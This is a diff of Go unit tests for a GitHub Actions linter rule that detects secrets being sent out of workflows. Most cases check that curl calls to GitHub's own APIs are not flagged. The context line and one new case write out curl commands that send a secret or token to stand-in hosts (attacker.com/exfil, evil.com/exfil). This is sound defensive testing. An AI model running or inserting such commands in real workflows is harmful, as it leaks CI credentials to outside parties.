@@ -86,6 +86,30 @@ curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
 			wantErrors:  1,
 			description: "Should detect curl with secret in auth header to external site",
 		},
+		{
+			name: "curl with secret directly to github api via variable indirection (legitimate)",
+			runScript: `api_url="https://api.github.com/repos/owner/repo"
+result=$(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" "$api_url/releases/latest")`,
+			wantErrors:  0,
+			description: "Should NOT flag curl when URL variable resolves to api.github.com",
+		},
+		{
+			name: "curl with secret to uploads.github.com (legitimate)",
+			runScript: `curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" --data-binary @file.zip "https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"`,
+			wantErrors:  0,
+			description: "Should NOT flag curl upload to uploads.github.com",
+		},
+		{
+			name: "curl with multi-line JSON body and github api URL (legitimate)",
+			runScript: `release_id=$(curl -s -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+  -H "Accept: application/vnd.github.v3+json" \
+  -d '{
+    "tag_name": "v1.0",
+    "name": "Release v1.0"
+  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
+			wantErrors:  0,
+			description: "Should NOT flag curl with multi-line JSON body posting to GitHub API",
+		},
 	}
 
 	for _, tt := range tests {
@@ -902,5 +926,78 @@ func TestSecretExfiltration_LineContainsCommand(t *testing.T) {
 		if got != tt.expected {
 			t.Errorf("lineContainsCommand(%q, %q) = %v, want %v", tt.line, tt.cmd, got, tt.expected)
 		}
+	}
+}
+
+// TestSecretExfiltration_EnvVarWithVarIndirection tests the case where a secret is
+// mapped to an env var and the curl URL is stored in another variable (shadPS4 pattern).
+func TestSecretExfiltration_EnvVarWithVarIndirection(t *testing.T) {
+	makeStep := func(script string) *ast.Step {
+		return &ast.Step{
+			Exec: &ast.ExecRun{
+				Run: &ast.String{
+					Value: script,
+					Pos:   &ast.Position{Line: 1, Col: 1},
+				},
+			},
+			Env: &ast.Env{
+				Vars: map[string]*ast.EnvVar{
+					"GITHUB_TOKEN": {
+						Value: &ast.String{Value: "${{ secrets.SHADPS4_TOKEN_REPO }}"},
+					},
+				},
+			},
+		}
+	}
+
+	tests := []struct {
+		name       string
+		runScript  string
+		wantErrors int
+		desc       string
+	}{
+		{
+			name: "curl with env var token to api.github.com via variable (legitimate)",
+			runScript: `api_url="https://api.github.com/repos/owner/repo"
+result=$(curl -H "Authorization: token $GITHUB_TOKEN" "$api_url/releases/latest")`,
+			wantErrors: 0,
+			desc:       "Should NOT flag when URL variable resolves to api.github.com",
+		},
+		{
+			name: "curl upload with env var token to uploads.github.com via variable (legitimate)",
+			runScript: `upload_url="https://uploads.github.com/repos/owner/repo/releases/1/assets?name=f"
+curl -X POST -H "Authorization: token $GITHUB_TOKEN" --data-binary @file "$upload_url"`,
+			wantErrors: 0,
+			desc:       "Should NOT flag when upload URL variable resolves to uploads.github.com",
+		},
+		{
+			name: "curl with env var token to multi-line json POST to github api (legitimate)",
+			runScript: `release_id=$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" \
+  -H "Accept: application/vnd.github.v3+json" \
+  -d '{
+    "tag_name": "v1.0"
+  }' "https://api.github.com/repos/owner/repo/releases" | jq -r '.id')`,
+			wantErrors: 0,
+			desc:       "Should NOT flag curl with multi-line JSON body to GitHub API",
+		},
+		{
+			name:       "curl with env var token to attacker site (malicious)",
+			runScript:  `curl -H "Authorization: token $GITHUB_TOKEN" "https://evil.com/exfil"`,
+			wantErrors: 1,
+			desc:       "Should flag curl sending env-var secret to non-legit destination",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			rule := NewSecretExfiltrationRule()
+			step := makeStep(tt.runScript)
+			job := &ast.Job{Steps: []*ast.Step{step}}
+			_ = rule.VisitJobPre(job)
+			gotErrors := len(rule.Errors())
+			if gotErrors != tt.wantErrors {
+				t.Errorf("%s: got %d errors, want %d. Errors: %v", tt.desc, gotErrors, tt.wantErrors, rule.Errors())
+			}
+		})
 	}
 }
